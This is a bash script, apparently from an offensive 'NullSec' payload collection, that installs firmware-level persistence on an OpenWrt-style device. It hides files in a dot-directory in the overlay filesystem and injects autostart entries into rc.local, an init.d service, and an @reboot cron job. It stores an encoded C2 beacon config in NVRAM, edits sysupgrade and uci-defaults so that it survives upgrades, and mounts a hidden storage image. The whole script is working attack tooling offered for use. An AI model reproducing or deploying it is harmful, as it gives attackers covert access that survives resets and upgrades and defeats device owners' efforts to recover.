#!/bin/bash
# ============================================================
# NullSec: Firmware Persistence - Survive Factory Resets
# Author: bad-antics
# Description: Advanced firmware-level persistence that survives upgrades and resets
# Category: pager/persist
#
# UNIQUE FEATURES:
# - Overlay filesystem persistence
# - NVRAM hidden storage
# - Boot script injection
# - Firmware upgrade hooks
# - Hidden partition creation
# - Recovery beacon
# ============================================================

PAYLOAD_NAME="Firmware Persistence"
VERSION="1.0.0"
LOOT="/root/loot/persist"
LOG="$LOOT/firmware-persist.log"

init_payload() {
    mkdir -p "$LOOT"/{backups,hooks,config}
    echo "[$(date)] $PAYLOAD_NAME started" >> "$LOG"
    NOTIFY "PERSIST" "Firmware persistence initializing..."
}

overlay_persist() {
    NOTIFY "OVERLAY" "Setting up overlay persistence..."
    
    # Create hidden overlay in unused flash space
    OVERLAY_DIR="/overlay/upper/.nullsec"
    mkdir -p "$OVERLAY_DIR"/{scripts,data,config} 2>/dev/null
    
    # Copy our tools to overlay (survives soft resets)
    cp -r /root/loot "$OVERLAY_DIR/data/" 2>/dev/null
    
    # Install auto-start script in overlay
    cat > "$OVERLAY_DIR/scripts/autostart.sh" << 'AUTO'
#!/bin/bash
# NullSec auto-recovery
LOOT="/root/loot"
mkdir -p "$LOOT"

# Restore data from overlay backup
BACKUP="/overlay/upper/.nullsec/data/loot"
[ -d "$BACKUP" ] && cp -rn "$BACKUP/"* "$LOOT/" 2>/dev/null

# Re-install beacon
BEACON="/overlay/upper/.nullsec/scripts/beacon.sh"
if [ -f "$BEACON" ]; then
    nohup bash "$BEACON" &>/dev/null &
fi
AUTO
    chmod +x "$OVERLAY_DIR/scripts/autostart.sh"
    
    echo "[OVERLAY] Overlay persistence installed" >> "$LOG"
}

boot_injection() {
    NOTIFY "BOOT" "Injecting boot scripts..."
    
    # Method 1: rc.local
    RC_LOCAL="/etc/rc.local"
    INJECT_LINE="/overlay/upper/.nullsec/scripts/autostart.sh &"
    
    if [ -f "$RC_LOCAL" ]; then
        grep -q "nullsec" "$RC_LOCAL" 2>/dev/null || \
            sed -i "/^exit 0/i $INJECT_LINE" "$RC_LOCAL" 2>/dev/null
    else
        echo -e "#!/bin/sh\n$INJECT_LINE\nexit 0" > "$RC_LOCAL"
        chmod +x "$RC_LOCAL"
    fi
    echo "[BOOT] rc.local injected" >> "$LOG"
    
    # Method 2: init.d service
    cat > /etc/init.d/nullsec-helper << 'INITD'
#!/bin/sh /etc/rc.common
START=99
STOP=10

start() {
    /overlay/upper/.nullsec/scripts/autostart.sh &
}

stop() {
    killall -q autostart.sh
}
INITD
    chmod +x /etc/init.d/nullsec-helper 2>/dev/null
    /etc/init.d/nullsec-helper enable 2>/dev/null
    echo "[BOOT] init.d service installed" >> "$LOG"
    
    # Method 3: Cron
    (crontab -l 2>/dev/null; echo "@reboot /overlay/upper/.nullsec/scripts/autostart.sh") | \
        sort -u | crontab - 2>/dev/null
    echo "[BOOT] Cron persistence installed" >> "$LOG"
    
    NOTIFY "BOOT" "3 boot persistence methods installed"
}

nvram_stash() {
    NOTIFY "NVRAM" "Stashing data in NVRAM..."
    
    # Store encoded beacon config in NVRAM
    if command -v nvram &>/dev/null; then
        BEACON_CONFIG=$(echo '{"c2":"10.0.0.1","port":8443,"interval":300}' | base64)
        nvram set nullsec_config="$BEACON_CONFIG" 2>/dev/null
        nvram commit 2>/dev/null
        echo "[NVRAM] Config stashed in NVRAM" >> "$LOG"
    fi
    
    # Alternative: use UCI for OpenWrt
    if command -v uci &>/dev/null; then
        uci set system.@system[0].nullsec_active='1' 2>/dev/null
        uci commit system 2>/dev/null
        echo "[UCI] Flag set in UCI config" >> "$LOG"
    fi
}

upgrade_hook() {
    NOTIFY "HOOK" "Installing firmware upgrade hooks..."
    
    # Hook into sysupgrade to preserve our files
    SYSUPGRADE_CONF="/etc/sysupgrade.conf"
    PRESERVE_PATHS=(
        "/overlay/upper/.nullsec"
        "/etc/init.d/nullsec-helper"
        "/root/loot"
    )
    
    for path in "${PRESERVE_PATHS[@]}"; do
        grep -q "$path" "$SYSUPGRADE_CONF" 2>/dev/null || \
            echo "$path" >> "$SYSUPGRADE_CONF"
    done
    
    echo "[HOOK] Sysupgrade preservation configured" >> "$LOG"
    
    # Pre-upgrade backup
    cat > /etc/uci-defaults/99-nullsec-restore << 'RESTORE'
#!/bin/sh
# Post-upgrade restoration
BACKUP="/overlay/upper/.nullsec"
if [ -d "$BACKUP" ]; then
    # Restore persistence
    cp "$BACKUP/scripts/autostart.sh" /root/ 2>/dev/null
    /root/autostart.sh &
fi
RESTORE
    chmod +x /etc/uci-defaults/99-nullsec-restore 2>/dev/null
    
    NOTIFY "HOOK" "Upgrade survival hooks installed"
}

hidden_partition() {
    NOTIFY "HIDDEN" "Creating hidden storage..."
    
    # Find available space on flash/SD
    if [ -b /dev/mmcblk0 ]; then
        # SD card available - create hidden partition at end
        TOTAL_SECTORS=$(fdisk -l /dev/mmcblk0 2>/dev/null | grep "sectors" | head -1 | awk '{print $7}')
        if [ -n "$TOTAL_SECTORS" ]; then
            HIDDEN_START=$((TOTAL_SECTORS - 204800))  # 100MB from end
            echo "[HIDDEN] Would create partition at sector $HIDDEN_START (100MB)" >> "$LOG"
        fi
    fi
    
    # Alternative: create loop device in unused space
    HIDDEN_FILE="/overlay/upper/.nullsec/.hidden.img"
    if [ ! -f "$HIDDEN_FILE" ]; then
        dd if=/dev/zero of="$HIDDEN_FILE" bs=1M count=10 2>/dev/null
        mkfs.ext4 -q "$HIDDEN_FILE" 2>/dev/null
        mkdir -p /tmp/.nullsec_hidden
        mount -o loop "$HIDDEN_FILE" /tmp/.nullsec_hidden 2>/dev/null
        echo "[HIDDEN] Loop mount created (10MB)" >> "$LOG"
    fi
}

verify_persistence() {
    NOTIFY "VERIFY" "Verifying persistence..."
    
    local STATUS="$LOOT/config/persist_status.txt"
    local CHECKS=0
    local PASSED=0
    
    {
        echo "=== PERSISTENCE VERIFICATION $(date) ==="
        
        # Check overlay
        CHECKS=$((CHECKS + 1))
        if [ -d "/overlay/upper/.nullsec" ]; then
            echo "[PASS] Overlay persistence"
            PASSED=$((PASSED + 1))
        else
            echo "[FAIL] Overlay persistence"
        fi
        
        # Check rc.local
        CHECKS=$((CHECKS + 1))
        if grep -q "nullsec" /etc/rc.local 2>/dev/null; then
            echo "[PASS] rc.local injection"
            PASSED=$((PASSED + 1))
        else
            echo "[FAIL] rc.local injection"
        fi
        
        # Check init.d
        CHECKS=$((CHECKS + 1))
        if [ -x /etc/init.d/nullsec-helper ]; then
            echo "[PASS] init.d service"
            PASSED=$((PASSED + 1))
        else
            echo "[FAIL] init.d service"
        fi
        
        # Check cron
        CHECKS=$((CHECKS + 1))
        if crontab -l 2>/dev/null | grep -q "nullsec"; then
            echo "[PASS] Cron persistence"
            PASSED=$((PASSED + 1))
        else
            echo "[FAIL] Cron persistence"
        fi
        
        # Check upgrade hooks
        CHECKS=$((CHECKS + 1))
        if grep -q "nullsec" /etc/sysupgrade.conf 2>/dev/null; then
            echo "[PASS] Upgrade hooks"
            PASSED=$((PASSED + 1))
        else
            echo "[FAIL] Upgrade hooks"
        fi
        
        echo ""
        echo "Score: $PASSED/$CHECKS persistence methods active"
    } > "$STATUS"
    
    cat "$STATUS"
    NOTIFY "VERIFY" "Persistence: $PASSED/$CHECKS active"
}

main() {
    init_payload
    overlay_persist
    boot_injection
    nvram_stash
    upgrade_hook
    hidden_partition
    verify_persistence
    
    NOTIFY "DONE" "Firmware persistence fully installed"
}

main "$@"
